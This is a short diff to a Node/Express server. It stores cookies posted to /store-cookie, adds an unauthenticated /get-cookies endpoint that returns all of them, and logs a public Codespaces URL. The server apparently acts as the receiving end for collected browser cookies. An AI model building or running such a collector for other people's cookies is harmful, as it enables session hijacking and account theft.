@@ -20,7 +20,7 @@ app.post("/store-cookie", (req, res) => {
         return res.status(400).json({ error: "No cookies received" });
     }
 
-    // Read the existing data from data.json file, or start with an empty array
+    // Read the existing data from cookie_data.json file, or start with an empty array
     let storedData = [];
     if (fs.existsSync("cookie_data.json")) {
         storedData = JSON.parse(fs.readFileSync("cookie_data.json"));
@@ -35,7 +35,18 @@ app.post("/store-cookie", (req, res) => {
     res.json({ message: "Cookies stored successfully" });
 });
 
+// GET endpoint to retrieve cookie data
+app.get("/get-cookies", (req, res) => {
+    // Read the data from cookie_data.json
+    if (fs.existsSync("cookie_data.json")) {
+        const data = JSON.parse(fs.readFileSync("cookie_data.json"));
+        res.json(data);  // Send the cookie data as JSON response
+    } else {
+        res.json({ message: "No cookie data found" });
+    }
+});
+
 // Start the server
 app.listen(PORT, () => {
-    console.log(`Server is running`);
+    console.log(`Server is running on https://cuddly-halibut-6xp55wwxr96cxrr6-3000.app.github.dev/`);
 });
